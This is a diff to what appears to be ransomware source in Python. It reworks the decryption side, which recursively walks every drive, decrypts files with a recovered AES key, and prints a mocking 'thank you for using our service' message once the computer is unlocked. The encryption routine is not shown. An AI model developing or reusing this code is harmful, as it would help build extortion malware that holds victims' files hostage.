@@ -80,19 +80,29 @@ def listUpTargetDir():
 
 
 def recursiveDecrypt(basepath):
-    files=[]
-    dirs=[]
-    for entry in os.listdir(basepath):
-        absolutePath=os.path.join(basepath, entry)
-        if os.path.isfile(absolutePath):
-            files.append(absolutePath)
-        elif os.path.isdir(absolutePath):
-            dirs.append(absolutePath)
+    try:
+        files=[]
+        dirs=[]
+        for entry in os.listdir(basepath):
+            absolutePath=os.path.join(basepath, entry)
+            if os.path.isfile(absolutePath):
+                files.append(absolutePath)
+            elif os.path.isdir(absolutePath):
+                dirs.append(absolutePath)
 
-    if (len(files)>0):
-        Decryptor(files).decryptFile()
-    for dir in dirs:
-        recursiveDecrypt(dir)
+        if (len(files)>0):
+            Decryptor(files).decryptFile()
+        for dir in dirs:
+            recursiveDecrypt(dir)
+    except Exception as e:
+        pass
+
+def doDec():
+    for drive in PathList:
+        recursiveDecrypt(drive)
+    while (len(ThreadPool)!=0):
+        th=ThreadPool.pop()
+        th.join()
 
 #복호화
 def decryptComputer():
@@ -102,15 +112,13 @@ def decryptComputer():
         AESKey=base64.b64decode(buf[10:])
         setDecryptModule(AESKey)
         print("Start Decryption... Do not turn off computer...")
-        th=Thread(target=warningInProgress)
+        
+        th=Thread(target=doDec)
         th.start()
-        for drive in PathList:
-            recursiveDecrypt(drive)
-            while (len(ThreadPool)!=0):
-                th=ThreadPool.pop()
-                th.join()
-        th2=Thread(target=completeDecryption)
-        th2.start()
+        warningInProgress()
+        th.join()
+        
+        completeDecryption()
         print("User computer is unlocked! Thank you for using our service:):):):):) Bye!")
         
         sleep(10)
